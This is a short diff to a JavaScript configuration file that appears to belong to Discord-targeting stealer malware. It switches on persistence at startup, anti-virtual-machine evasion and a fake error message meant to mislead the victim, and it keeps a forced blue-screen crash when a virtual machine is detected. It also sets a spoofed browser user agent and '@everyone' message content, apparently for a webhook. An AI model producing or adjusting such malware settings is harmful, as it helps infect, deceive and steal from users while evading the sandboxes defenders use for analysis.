@@ -9,10 +9,10 @@ module.exports = {
     content: '@everyone',
   },
   userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
-  addToStartup: false,
-  vmProtect: false,
+  addToStartup: true,
+  vmProtect: true,
   bsodIfVm: true,
-  fakeError: false,
+  fakeError: true,
   wifiNetworks: false,
   discord: {
     uninstall: false,
